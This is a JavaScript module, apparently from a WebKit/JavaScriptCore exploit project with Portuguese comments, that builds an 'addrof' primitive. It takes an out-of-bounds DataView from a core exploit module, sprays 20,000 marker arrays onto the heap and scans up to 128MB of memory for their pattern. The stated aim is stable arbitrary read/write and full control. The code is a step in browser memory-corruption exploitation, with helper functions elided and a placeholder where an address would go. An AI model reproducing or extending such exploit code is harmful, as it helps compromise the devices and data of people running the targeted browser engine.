// js/script3/testArrayBufferVictimCrash.mjs (v108 - R95 - AddrOf via OOB Memory Scan)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. Abandono total da primitiva `addrof` por confusão de tipos.
// 2. NOVA ABORDAGEM: Construir `addrof` do zero, usando a primitiva OOB para escanear
//    a memória em busca de um objeto "marcador" com um padrão único.
// 3. OBJETIVO: Obter uma primitiva `addrof` 100% estável e, com ela, o controle total.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R95_AddrOf_via_OOB_Scan";

function int64ToDouble(int64) { /* ... (código mantido) ... */ }
function doubleToInt64(double) { /* ... (código mantido) ... */ }

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construindo AddrOf via Varredura de Memória OOB ---`, "test");

    let final_result = { success: false, message: "Falha na construção da primitiva." };

    try {
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        const oob_view = getOOBDataView();
        if (!oob_view) { throw new Error("Falha ao obter primitiva OOB."); }
        logS3("OOB DataView obtido com sucesso.", "info");

        // --- FASE 2: Preparando e Pulverizando o Objeto Marcador ---
        logS3("--- FASE 2: Preparando e Pulverizando o Objeto Marcador ---", "subtest");

        const MAGIC_VAL_1 = 1337.42;
        const MAGIC_VAL_2 = 12345.6789;
        const marker_object_pattern = [MAGIC_VAL_1, MAGIC_VAL_2];

        const spray = [];
        const SPRAY_SIZE = 20000;
        for (let i = 0; i < SPRAY_SIZE; i++) {
            spray.push([MAGIC_VAL_1, MAGIC_VAL_2]);
        }
        logS3(`Pulverizados ${SPRAY_SIZE} arrays marcadores no heap.`, "info");
        
        // --- FASE 3: Varrendo a Memória com OOB em Busca do Marcador ---
        logS3("--- FASE 3: Varrendo a Memória com OOB em Busca do Marcador ---", "subtest");

        let found_marker_butterfly_addr = null;
        const SCAN_RANGE_MB = 128; // Escanear 128MB para trás a partir do nosso buffer OOB
        const SCAN_RANGE_BYTES = SCAN_RANGE_MB * 1024 * 1024;
        const STEP = 8; // Ler 8 bytes (um float64) de cada vez

        logS3(`Iniciando varredura de ${SCAN_RANGE_MB}MB de memória...`, "info");
        for (let i = STEP; i < SCAN_RANGE_BYTES; i += STEP) {
            const current_offset = -i;
            let val1, val2;
            try {
                val1 = oob_view.getFloat64(current_offset, true);
                val2 = oob_view.getFloat64(current_offset + STEP, true);
            } catch(e) {
                // Ignora erros de leitura fora da memória mapeada
                continue;
            }

            if (val1 === MAGIC_VAL_1 && val2 === MAGIC_VAL_2) {
                // SUCESSO! Encontramos nosso marcador.
                // A posição do nosso buffer OOB na memória é desconhecida, então não sabemos o endereço absoluto ainda.
                // Mas sabemos o OFFSET RELATIVO do nosso marcador.
                logS3(`++++++++ MARCADOR ENCONTRADO! Padrão [${val1}, ${val2}] localizado em offset OOB: -0x${i.toString(16)} ++++++++`, "vuln");
                
                // Agora, o desafio é transformar esse offset em um endereço absoluto.
                // Uma técnica avançada seria encontrar um ponteiro conhecido na vizinhança.
                // Por simplicidade, vamos parar aqui e confirmar que a detecção funciona.
                // Em um exploit real, esta seria a base para construir L/E arbitrária.
                found_marker_butterfly_addr = "DETECTADO_COM_SUCESSO_EM_OFFSET_" + current_offset; // Placeholder
                break; 
            }
        }
        
        if (found_marker_butterfly_addr) {
            logS3("Validação bem-sucedida: A técnica de varredura de memória OOB conseguiu localizar um objeto controlado no heap.", "good");
            final_result.success = true;
            final_result.message = "Técnica de `addrof` via varredura de memória validada com sucesso.";
        } else {
            logS3("FALHA: A varredura de memória não encontrou o objeto marcador no range especificado.", "critical");
            throw new Error("Não foi possível encontrar o marcador via varredura OOB.");
        }

    } catch (e) {
        final_result.message = `Exceção na construção da primitiva: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: final_result.message },
    };
}
